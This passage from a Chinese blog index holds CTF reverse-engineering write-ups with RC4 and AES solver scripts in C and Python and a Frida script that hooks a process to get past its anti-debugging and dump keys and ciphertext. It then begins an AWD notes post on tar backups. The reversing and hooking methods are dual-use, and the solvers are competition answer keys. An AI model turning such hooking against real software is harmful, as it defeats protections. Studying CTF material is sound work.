base64.b64decode(enc.encode()).decode()    key = list(ord(i) ^ 102 for i in key)    s = list(i for i in range(256))    j = 0    for i in range(256):        j = (s[i] + j + key[i % len(key)]) % 256        tmp = s[i]        s[i] = s[j]        s[j] = tmp    i = j = 0    data = list()    for _ in range(50):        i = (i + 1) % 256        j = (s[i] + j) % 256        tmp = s[i]        s[i] = s[j]        s[j] = tmp        data.append(s[(s[i] + s[j]) % 256])    result = &quot;&quot;    for c, k in zip(text, data):        result += chr(ord(c) ^ k ^ 51)    print(result)dec()\n\n\n\nMidre先去主函数的花\n\n\nnop完后发现还有问题，我们在下面的代码中按c试探一下，发现从第二个字节码开始就可以恢复为正常函数，所以还要一个垃圾指令，nop掉后即可看到主函数逻辑。\n\n加密函数里面还有花指令，nop掉后即可看到完整代码。\n\n去掉花指令后，可以看到主函数。首先是一个异或”what’s this”，后面是一个加密函数。\n\n在这个加密函数里面有一个比较，可以找到密文。前面有一个函数，像是在按密钥的长度决定加密的轮数，再看加密函数的参数，像极了一个AES加密，且有两个常量’5855eab53a2275d3’和’b051a57d6d05b393’，推测一个是密钥一个是IV。\n\n\n直接进行解密即可得到结果\n\n决赛reverse1两个rc4加密，一个是原版另一个是被修改的版本。加密过程就是用key1先加密key，再用加密的key去加密flag。所以按照这个逻辑来逆向即可解密。rc4原版加密是对称加密，而修改版的rc4只要把减号改为加号就行。\n\n在比赛时这题并没有写出来，脚本最后的结果一直是乱码，后面复盘时发现了一个关键的东西。当盒子是char类型时，只要盒子里的元素被当作下标时，就要把这个下标转成(unsigned char)，如果不转的话在后面的下标就是一个负数。当盒子是unsigned char类型时，(box[v5] + box[v6])作为下标时要转化为(unsigned char)，如果不转化的话(box[v5] + box[v6])就有可能会超过下标255。所以box[(unsigned char)(box[v5] + box[v6])]实际上就是box[(box[v5] + box[v6])%256]。\n\n\n\n所以在写题中一定要注意下标的数值是否合规。\n\n\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;char input[32] = &#123;    0x4E, 0x47, 0x38, 0x47, 0x62, 0x0A, 0x79, 0x6A, 0x03, 0x66, 0xC0, 0x69, 0x8D, 0x1C, 0x84, 0x0F,    0x54, 0x4A, 0x3B, 0x08, 0xE3, 0x30, 0x4F, 0xB9, 0x6C, 0xAB, 0x36, 0x24, 0x52, 0x81, 0xCF, 0x00&#125;;char key[100] = &quot;ban_debug!&quot;;char key1[] = &quot;keykey&quot;;unsigned char box[256];int getbox(unsigned char*box, char*key,int keylen) &#123;    char v4;    int v6 = 0;    int v8[256];    memset(v8, 0, 0x400uLL);    for (int i = 0; i &lt;= 255; ++i)    &#123;        box[i] = i;        v8[i] = (unsigned char)key[i % keylen];    &#125;    v6 = 0;    for (int j = 0; j &lt;= 255; ++j)    &#123;               v6 = (v8[j] + v6 + box[j]) % 256;        v4 = box[j];        box[j] = box[v6];        box[v6] = v4;    &#125;    return 0;&#125;int dec1(unsigned char*box, unsigned char* input,int len) &#123;    char v4;     int v5;     int v6;     int i;     v5 = 0;    v6 = 0;    for (i = 0; ; ++i)    &#123;        if (len &lt;= i)            break;        v5 = (v5 + 1) % 256;        v6 = (v6 + box[v5]) % 256;        v4 = box[v5];        box[v5] = box[v6];        box[v6] = v4;        input[i] ^= box[(unsigned char)(box[v5] + box[v6])];    &#125;    return 0;&#125;int dec2(unsigned char* box,char* input, int len) &#123;    char v4;    int v5;     int v6;    int i;    v5 = 0;    v6 = 0;    for (i = 0; ; ++i)    &#123;        if (len &lt;= i)            break;        v5 = (v5 + 1) % 256;        v6 = (v6 + box[v5]) % 256;        v4 = box[v5];        box[v5] = box[v6];        box[v6] = v4;        input[i] += box[(unsigned char)(box[v5] + box[v6])];    &#125;    return 0;&#125;int main() &#123;    getbox(box, key1, strlen(key1));    dec1(box, (unsigned char*)key, strlen(key));    memset(box, 0, sizeof(box));    getbox(box, key, strlen(key));    dec2(box, input, 32);    for (int i = 0; i &lt; 31; i++) &#123;        printf(&quot;%c&quot;, input[i]);    &#125;       //puts(input);    &#125;\n\nreverse2用010editer把ABC全部修改为UPX，ida分析后就是一个base64加密函数，直接就可以看到明文和码表，直接解密就得flag\nreverse3在main函数下面有个sub_140002E90函数，这个创建了一个子进程，并进行了一些写内存操作，可执行文件就是上面那串字符串，有一个异或0x11加密，解密得到C:\\Users\\Public\\1.exe。\n\n在1.exe的mian函数上面有一个函数。\n\n逐一分析看看，能在sub_140001690函数里面找到一个255大小的盒，但是这个盒是被修改了的不是常规的AES盒，sub_140001380函数像是一个AES的密钥轮函数。继续往main函数上面看，还能看到密钥拓展函数。这就是一个AES无疑了。这时候我们再回头看main函数。\n\n main函数的逻辑大概如下图。有一个加载密钥的函数，一个输入函数，还有密文。这个时候就可以解密了，但是不出所料的解不出来。这里加了反调试，我们调试不了，于是我们用fridahook来获取值。\n\n要hook的数据（手动计算IDA中的地址偏移用于hook，这里是0x0000000140017060后面的0x17060）\n1.密钥0x0000000140017060\n\n\n2.s盒0x140005160\n\n[!NOTE]\nhook盒和密文时，在加密函数使用盒时hook，最开始就hook的话可能在盒被修改前。\n\n\n\n3.密文0x1400152DC\n\n\n4.输入0x140001E24的rdx\nmian函数中我们的输入被保存到了v11中，然后在下面的for循环调用，我们直接获取寄存器的值就行，[rbp+rax+0E0h+var_100]就是v11的数据。\n\n！要把可见字符拆分成两段分别hook，因为输入字符最好要保持在48个以内（小于等于密文长度）\n\n\n对比分析发现我们的输入被改了，单字节加密，就是被加了一点偏移。我们可以打印所有可见字符，构建一个表查找对应查找原来的数据。密钥也被修改了。s盒也被修改了，对比没有魔改的AES盒是相同的，所以AES的魔改又被改回了正常的AES加密，直接用常规解密就行。密文是不变的。我们直接提出来写出解密脚本。以下为c和py的解密脚本和hook脚本。\n#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;typedef struct &#123;    uint32_t eK[44], dK[44];    // encKey, decKey    int Nr; // 10 rounds&#125;AesKey;#define BLOCKSIZE 16  //AES-128分组长度为16字节// uint8_t y[4] -&gt; uint32_t x#define LOAD32H(x, y) \\  do &#123; (x) = ((uint32_t)((y)[0] &amp; 0xff)&lt;&lt;24) | ((uint32_t)((y)[1] &amp; 0xff)&lt;&lt;16) | \\             ((uint32_t)((y)[2] &amp; 0xff)&lt;&lt;8)  | ((uint32_t)((y)[3] &amp; 0xff));&#125; while(0)// uint32_t x -&gt; uint8_t y[4]#define STORE32H(x, y) \\  do &#123; (y)[0] = (uint8_t)(((x)&gt;&gt;24) &amp; 0xff); (y)[1] = (uint8_t)(((x)&gt;&gt;16) &amp; 0xff);   \\       (y)[2] = (uint8_t)(((x)&gt;&gt;8) &amp; 0xff); (y)[3] = (uint8_t)((x) &amp; 0xff); &#125; while(0)// 从uint32_t x中提取从低位开始的第n个字节#define BYTE(x, n) (((x) &gt;&gt; (8 * (n))) &amp; 0xff)/* used for keyExpansion */// 字节替换然后循环左移1位#define MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \\                ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))// uint32_t x循环左移n位#define ROF32(x, n)  (((x) &lt;&lt; (n)) | ((x) &gt;&gt; (32-(n))))// uint32_t x循环右移n位#define ROR32(x, n)  (((x) &gt;&gt; (n)) | ((x) &lt;&lt; (32-(n))))/* for 128-bit blocks, Rijndael never uses more than 10 rcon values */// AES-128轮常量static const uint32_t rcon[10] = &#123;        0x01000000UL, 0x02000000UL, 0x04000000UL, 0x08000000UL, 0x10000000UL,        0x20000000UL, 0x40000000UL, 0x80000000UL, 0x1B000000UL, 0x36000000UL&#125;;// S盒unsigned char S[256] = &#123;        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16&#125;;//逆S盒unsigned char inv_S[256] = &#123;        0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,        0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,        0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,        0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,        0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,        0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,        0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,        0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,        0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,        0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,        0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,        0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,        0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,        0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,        0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,        0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D&#125;;/* copy in[16] to state[4][4] */int loadStateArray(uint8_t(*state)[4], const uint8_t* in) &#123;    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            state[j][i] = *in++;        &#125;    &#125;    return 0;&#125;/* copy state[4][4] to out[16] */int storeStateArray(uint8_t(*state)[4], uint8_t* out) &#123;    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            *out++ = state[j][i];        &#125;    &#125;    return 0;&#125;//秘钥扩展int keyExpansion(const uint8_t* key, uint32_t keyLen, AesKey* aesKey) &#123;    if (NULL == key || NULL == aesKey) &#123;        printf(&quot;keyExpansion param is NULL\\n&quot;);        return -1;    &#125;    if (keyLen != 16) &#123;        printf(&quot;keyExpansion keyLen = %d, Not support.\\n&quot;, keyLen);        return -1;    &#125;    uint32_t* w = aesKey-&gt;eK;  //加密秘钥    uint32_t* v = aesKey-&gt;dK;  //解密秘钥    /* keyLen is 16 Bytes, generate uint32_t W[44]. */    /* W[0-3] */    for (int i = 0; i &lt; 4; ++i) &#123;        LOAD32H(w[i], key + 4 * i);    &#125;    /* W[4-43] */    for (int i = 0; i &lt; 10; ++i) &#123;        w[4] = w[0] ^ MIX(w[3]) ^ rcon[i];        w[5] = w[1] ^ w[4];        w[6] = w[2] ^ w[5];        w[7] = w[3] ^ w[6];        w += 4;    &#125;    w = aesKey-&gt;eK + 44 - 4;    //解密秘钥矩阵为加密秘钥矩阵的倒序，方便使用，把ek的11个矩阵倒序排列分配给dk作为解密秘钥    //即dk[0-3]=ek[41-44], dk[4-7]=ek[37-40]... dk[41-44]=ek[0-3]    for (int j = 0; j &lt; 11; ++j) &#123;        for (int i = 0; i &lt; 4; ++i) &#123;            v[i] = w[i];        &#125;        w -= 4;        v += 4;    &#125;    return 0;&#125;// 轮秘钥加int addRoundKey(uint8_t(*state)[4], const uint32_t* key) &#123;    uint8_t k[4][4];    /* i: row, j: col */    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            k[i][j] = (uint8_t)BYTE(key[j], 3 - i);  /* 把 uint32 key[4] 先转换为矩阵 uint8 k[4][4] */            state[i][j] ^= k[i][j];        &#125;    &#125;    return 0;&#125;//字节替换int subBytes(uint8_t(*state)[4]) &#123;    /* i: row, j: col */    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            state[i][j] = S[state[i][j]]; //直接使用原始字节作为S盒数据下标        &#125;    &#125;    return 0;&#125;//逆字节替换int invSubBytes(uint8_t(*state)[4]) &#123;    /* i: row, j: col */    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            state[i][j] = inv_S[state[i][j]];        &#125;    &#125;    return 0;&#125;//行移位int shiftRows(uint8_t(*state)[4]) &#123;    uint32_t block[4] = &#123; 0 &#125;;    /* i: row */    for (int i = 0; i &lt; 4; ++i) &#123;        //便于行循环移位，先把一行4字节拼成uint_32结构，移位后再转成独立的4个字节uint8_t        LOAD32H(block[i], state[i]);        block[i] = ROF32(block[i], 8 * i);        STORE32H(block[i], state[i]);    &#125;    return 0;&#125;//逆行移位int invShiftRows(uint8_t(*state)[4]) &#123;    uint32_t block[4] = &#123; 0 &#125;;    /* i: row */    for (int i = 0; i &lt; 4; ++i) &#123;        LOAD32H(block[i], state[i]);        block[i] = ROR32(block[i], 8 * i);        STORE32H(block[i], state[i]);    &#125;    return 0;&#125;/* Galois Field (256) Multiplication of two Bytes */// 两字节的伽罗华域乘法运算uint8_t GMul(uint8_t u, uint8_t v) &#123;    uint8_t p = 0;    for (int i = 0; i &lt; 8; ++i) &#123;        if (u &amp; 0x01) &#123;    //            p ^= v;        &#125;        int flag = (v &amp; 0x80);        v &lt;&lt;= 1;        if (flag) &#123;            v ^= 0x1B; /* x^8 + x^4 + x^3 + x + 1 */        &#125;        u &gt;&gt;= 1;    &#125;    return p;&#125;// 列混合int mixColumns(uint8_t(*state)[4]) &#123;    uint8_t tmp[4][4];    uint8_t M[4][4] = &#123; &#123;0x02, 0x03, 0x01, 0x01&#125;,                       &#123;0x01, 0x02, 0x03, 0x01&#125;,                       &#123;0x01, 0x01, 0x02, 0x03&#125;,                       &#123;0x03, 0x01, 0x01, 0x02&#125; &#125;;    /* copy state[4][4] to tmp[4][4] */    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            tmp[i][j] = state[i][j];        &#125;    &#125;    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;  //伽罗华域加法和乘法            state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j])                ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]);        &#125;    &#125;    return 0;&#125;// 逆列混合int invMixColumns(uint8_t(*state)[4]) &#123;    uint8_t tmp[4][4];    uint8_t M[4][4] = &#123; &#123;0x0E, 0x0B, 0x0D, 0x09&#125;,                       &#123;0x09, 0x0E, 0x0B, 0x0D&#125;,                       &#123;0x0D, 0x09, 0x0E, 0x0B&#125;,                       &#123;0x0B, 0x0D, 0x09, 0x0E&#125; &#125;;  //使用列混合矩阵的逆矩阵    /* copy state[4][4] to tmp[4][4] */    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            tmp[i][j] = state[i][j];        &#125;    &#125;    for (int i = 0; i &lt; 4; ++i) &#123;        for (int j = 0; j &lt; 4; ++j) &#123;            state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j])                ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]);        &#125;    &#125;    return 0;&#125;// AES-128加密接口，输入key应为16字节长度，输入长度应该是16字节整倍数，// 这样输出长度与输入长度相同，函数调用外部为输出数据分配内存int aesEncrypt(const uint8_t* key, uint32_t keyLen, const uint8_t* pt, uint8_t* ct, uint32_t len) &#123;    AesKey aesKey;    uint8_t* pos = ct;    const uint32_t* rk = aesKey.eK;  //解密秘钥指针    uint8_t out[BLOCKSIZE] = &#123; 0 &#125;;    uint8_t actualKey[16] = &#123; 0 &#125;;    uint8_t state[4][4] = &#123; 0 &#125;;    if (NULL == key || NULL == pt || NULL == ct) &#123;        printf(&quot;param err.\\n&quot;);        return -1;    &#125;    if (keyLen &gt; 16) &#123;        printf(&quot;keyLen must be 16.\\n&quot;);        return -1;    &#125;    if (len % BLOCKSIZE) &#123;        printf(&quot;inLen is invalid.\\n&quot;);        return -1;    &#125;    memcpy(actualKey, key, keyLen);    keyExpansion(actualKey, 16, &amp;aesKey);  // 秘钥扩展    // 使用ECB模式循环加密多个分组长度的数据    for (int i = 0; i &lt; len; i += BLOCKSIZE) &#123;        // 把16字节的明文转换为4x4状态矩阵来进行处理        loadStateArray(state, pt);        // 轮秘钥加        addRoundKey(state, rk);        for (int j = 1; j &lt; 10; ++j) &#123;            rk += 4;            subBytes(state);   // 字节替换            shiftRows(state);  // 行移位            mixColumns(state); // 列混合            addRoundKey(state, rk); // 轮秘钥加        &#125;        subBytes(state);    // 字节替换        shiftRows(state);  // 行移位        // 此处不进行列混合        addRoundKey(state, rk + 4); // 轮秘钥加        // 把4x4状态矩阵转换为uint8_t一维数组输出保存        storeStateArray(state, pos);        pos += BLOCKSIZE;  // 加密数据内存指针移动到下一个分组        pt += BLOCKSIZE;   // 明文数据指针移动到下一个分组        rk = aesKey.eK;    // 恢复rk指针到秘钥初始位置    &#125;    return 0;&#125;// AES128解密， 参数要求同加密int aesDecrypt(const uint8_t* key, uint32_t keyLen, const uint8_t* ct, uint8_t* pt, uint32_t len) &#123;    AesKey aesKey;    uint8_t* pos = pt;    const uint32_t* rk = aesKey.dK;  //解密秘钥指针    uint8_t out[BLOCKSIZE] = &#123; 0 &#125;;    uint8_t actualKey[16] = &#123; 0 &#125;;    uint8_t state[4][4] = &#123; 0 &#125;;    if (NULL == key || NULL == ct || NULL == pt) &#123;        printf(&quot;param err.\\n&quot;);        return -1;    &#125;    if (keyLen &gt; 16) &#123;        printf(&quot;keyLen must be 16.\\n&quot;);        return -1;    &#125;    if (len % BLOCKSIZE) &#123;        printf(&quot;inLen is invalid.\\n&quot;);        return -1;    &#125;    memcpy(actualKey, key, keyLen);    keyExpansion(actualKey, 16, &amp;aesKey);  //秘钥扩展，同加密    for (int i = 0; i &lt; len; i += BLOCKSIZE) &#123;        // 把16字节的密文转换为4x4状态矩阵来进行处理        loadStateArray(state, ct);        // 轮秘钥加，同加密        addRoundKey(state, rk);        for (int j = 1; j &lt; 10; ++j) &#123;            rk += 4;            invShiftRows(state);    // 逆行移位            invSubBytes(state);     // 逆字节替换，这两步顺序可以颠倒            addRoundKey(state, rk); // 轮秘钥加，同加密            invMixColumns(state);   // 逆列混合        &#125;        invSubBytes(state);   // 逆字节替换        invShiftRows(state);  // 逆行移位        // 此处没有逆列混合        addRoundKey(state, rk + 4);  // 轮秘钥加，同加密        storeStateArray(state, pos);  // 保存明文数据        pos += BLOCKSIZE;  // 输出数据内存指针移位分组长度        ct += BLOCKSIZE;   // 输入数据内存指针移位分组长度        rk = aesKey.dK;    // 恢复rk指针到秘钥初始位置    &#125;    return 0;&#125;// 方便输出16进制数据void printHex(uint8_t* ptr, int len, char* tag) &#123;    printf(&quot;%s\\ndata[%d]: &quot;, tag, len);    for (int i = 0; i &lt; len; ++i) &#123;        printf(&quot;%.2X &quot;, *ptr++);    &#125;    printf(&quot;\\n&quot;);&#125;char table[] = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\\]^_`&#123;|&#125;~ &quot;;char res[] = &#123; 0x36,0x35,0x34,0x33,0x3a,0x39,0x38,0x37,0x3e,0x3d,0x85,0x84,0x83,0x8a,0x89,0x88,0x87,0x8e,0x8d,0x8c,0x8b,0x92,0x91,0x90,0x8f,0x76,0x75,0x74,0x73,0x7a,0x79,0x78,0x77,0x7e,0x7d,0x7c,0xa5,0xa4,0xa3,0xaa,0xa9,0xa8,0xa7,0xae,0xad,0xac,0xab,0xb2,0xb1,0xb0,0xaf,0x96,0x95,0x94,0x93,0x9a,0x99,0x98,0x97,0x9e,0x9d,0x9c,0x45,0x44,0x43,0x4a,0x49,0x48,0x47,0x4e,0x4d,0x4c,0x4b,0x52,0x51,0x50,0x4f,0x3c,0x3b,0x42,0x41,0x40,0x3f,0xa6,0x9b,0xa2,0xa1,0xa0,0x9f,0x86,0x7b,0x82,0x81,0x80,0x66,0x66&#125;;char getcc(char in) &#123;    for (size_t i = 0; i &lt; 96; i++)    &#123;        if (in == res[i])        &#123;            return table[i];        &#125;    &#125;&#125;int main() &#123;        // case 1    const uint8_t key[16] = &#123; 0x05,0x06,0x07,0x08,0x37,0x42,0x4d,0x58,0x63,0x00,0x0a,0x0c,0x0d,0x0e,0x0f,0x10 &#125;; //十六字节密钥    const uint8_t pt[48] = &#123; 0x71,0x55,0x7f,0xa8,0xfa,0x0e,0xa3,0x19,0xa0,0x5c,0xf9,0x0e,0x9b,0x0b,0x5e,0xfc,0xb5,0xa8,0x49,0xfd,0x90,0x99,0x74,0xc7,0x77,0x02,0x6a,0xf5,0x9a,0x6a,0xba,0x7f,0xfb,0xe7,0x68,0xda,0x54,0xee,0xe8,0xbb,0x78,0x01,0xe7,0xbb,0xa2,0x95,0x95,0xfa &#125;;    uint8_t ct[16] = &#123; 0 &#125;;     // 外部申请输出数据内存，用于加密后的数据    uint8_t plain[16] = &#123; 0 &#125;;  // 外部申请输出数据内存，用于解密后的数据    for (int i = 0; i &lt; 3; i++) &#123;        for (int j = 0; j &lt; 16; j++) &#123;            ct[j] = pt[j + i * 16];        &#125;        aesDecrypt(key, 16, ct, plain, 16);        for (int k = 0; k &lt; 16; k++) &#123;            printf(&quot;%c&quot;, getcc(plain[k]));        &#125;    &#125;    return 0;&#125;\n\nimport base64from base64 import encodefrom Crypto.Cipher import AESkey = bytes.fromhex(&quot;0506070837424d5863000a0c0d0e0f10&quot;) #需要加密的内容，bytes类型aes = AES.new(key,AES.MODE_ECB) #创建一个aes对象enc =&quot;71557FA8FA0EA319A05CF90E9B0B5EFCB5A849FD909974C777026AF59A6ABA7FFBE768DA54EEE8BB7801E7BBA29595FA0F&quot;result =&quot;&quot;for i in range(len(enc)//32):    #print(enc[i*32:(i+1)*32:])    den_text = aes.decrypt(bytes.fromhex(enc[i*32:(i+1)*32:]))  # 解密密文    result+= den_text.hex()    #print(den_text.hex(),end=&#x27;&#x27;)table = dict()chars = &quot;!#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~ &quot;enc_char =&quot;&quot;&quot;45 43 4a 49 48 47 4e 4d 4c 4b 52 51 50 4f 36             35 34 33 3a 39 38 37 3e 3d 3c 3b 42 41 40 3f a6              a5 a4 a3 aa a9 a8 a7 ae ad ac ab b2 b1 b0 af 96            95 94 93 9a 99 98 97 9e 9d 9c 9b a2 a1 a0 9f 86 85            84 83 8a 89 88 87 8e 8d 8c 8b 92 91 90 8f 76 75            74 73 7a 79 78 77 7e 7d 7c 7b 82 81 80 66 66 66 &quot;&quot;&quot;b = enc_char.replace(&#x27; &#x27;,&#x27;&#x27;).replace(&#x27;\\n&#x27;,&#x27;&#x27;)for i,char in enumerate(chars):    tmp = b[2 * i:2 * i + 2]    table[bytes.fromhex(tmp)] = charflag =&quot;&quot;for i in bytes.fromhex(result):    flag+= table.get(i.to_bytes(),&#x27;?&#x27;)print(flag)\n\nhook脚本\nvar inter=setInterval(function () &#123;    var sgame = Process.findModuleByName(&quot;1.exe&quot;);    var baseaddr = sgame.base    if(sgame==null)&#123;        console.log(&quot;无&quot;);        return;    &#125;    console.log(&quot;base&quot;+baseaddr);    clearInterval(inter);    console.log(&quot;sbox&quot;)    console.log(hexdump(baseaddr.add(0x005160),&#123;length:255,ansi:true&#125;))    console.log(&quot;key&quot;)    console.log(hexdump(baseaddr.add(0x0017060),&#123;length:16,ansi:true&#125;))        Interceptor.attach(baseaddr.add(0x001E7F), &#123;     onEnter: function (args) &#123;        var rax=this.context.rax;         console.log(&quot;secret&quot; +rax);        console.log(hexdump(ptr(rax),&#123;length: 48,ansi:true&#125;));    &#125;&#125;),    Interceptor.attach(baseaddr.add(0x001E29), &#123;         onEnter: function (args) &#123;            var rdx=this.context.rdx;             console.log(&quot;input&quot; +rdx);               console.log(hexdump(ptr(rdx),&#123;length: 95,ansi:true&#125;));        &#125; &#125;),Interceptor.attach(baseaddr.add(0x001720), &#123;     onEnter: function (args) &#123;        console.log(hexdump(baseaddr.add(0x5160),&#123;length: 256,ansi:true&#125;));    &#125;&#125;)&#125;,1)\n\n参考wp A1natas 2024 浙江省赛决赛 WriteUp\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"AWD的一些杂物","url":"/2024/12/20/AWD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9D%82%E7%89%A9/","content":"Linux操作打包备份在 Linux 中，可以通过将 .tar 文件解压到指定目录来完成备份恢复。以下是详细步骤：\n\n1. 解压到目标目录使用 tar 命令时可以通过 -C 选项指定目标解压目录。假设你的备份文件是 backup.tar，目标目录是 /home/user/restore，操作如下：\n基本解压命令tar -xvf backup.tar -C /home/user/restore\n\n\n-x：表示解压。\n-v：显示解压的详细过程（可选）。\n-f：指定解压的文件。\n-C：指定解压的目标目录。\n\n\n2. 备份目录打包恢复如果你有一个备份文件夹 mydata，需要先打包备份，然后再恢复，操作如下：\n备份文件夹到 .tartar -cvf backup.tar /path/to/mydata\n\n恢复到指定目录如果目标目录不存在，可以先创建：\nmkdir -p /home/user/restore\n\n然后执行解压：\ntar -xvf backup.tar -C /home/user/restore\n\n\n3. 带压缩的备份与恢复压缩备份使用 gzip 或 bzip2 进行压缩：\ntar -czvf backup.tar.gz /path/to/mydata  # gzip 压缩tar -cjvf backup.tar.bz2 